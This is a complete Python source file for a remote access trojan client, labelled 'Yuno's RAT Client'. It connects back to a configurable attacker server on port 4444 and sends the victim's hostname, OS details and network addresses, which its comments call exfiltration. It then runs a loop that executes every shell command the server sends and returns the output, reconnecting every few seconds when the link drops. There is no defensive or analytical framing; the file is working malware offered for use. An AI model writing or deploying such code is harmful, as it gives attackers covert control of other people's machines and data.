#!/usr/bin/env python3
import socket
import platform
import subprocess
import json
import time
import netifaces

# Server settings
SERVER_HOST = "127.0.0.1"  # Update to your server IP (e.g., Render URL if deployed)
SERVER_PORT = 4444

def get_system_info():
    """Gather system information."""
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.release(),
        "architecture": platform.machine(),
    }
    return info

def get_network_info():
    """Gather network interface information."""
    interfaces = netifaces.interfaces()
    network_info = {}
    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                network_info[iface] = addr.get("addr", "Unknown")
    return network_info

def execute_command(command):
    """Execute a system command and return the output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"

def main():
    while True:
        client_socket = None
        try:
            # Connect to the RAT server
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print("[*] Connected to RAT server")

            # Exfiltrate system and network info
            system_info = get_system_info()
            network_info = get_network_info()
            exfil_data = {
                "system": system_info,
                "network": network_info
            }
            client_socket.send(json.dumps(exfil_data).encode('utf-8'))
            print("[*] Exfiltrated data sent to RAT server")

            # Command loop
            while True:
                data = client_socket.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    break
                if data.strip() == "exit":
                    print("[*] Received exit command")
                    client_socket.close()
                    return
                # Execute the command and send back the result
                output = execute_command(data)
                client_socket.send(output.encode('utf-8'))
                print(f"[*] Executed command: {data}")

        except Exception as e:
            print(f"[!] Connection failed: {e}")
            print("[*] Retrying in 5 seconds...")
        finally:
            if client_socket is not None:
                client_socket.close()

if __name__ == "__main__":
    print("=== Yuno's RAT Client ===")
    print("A remote access client by Yuno\n")
    main()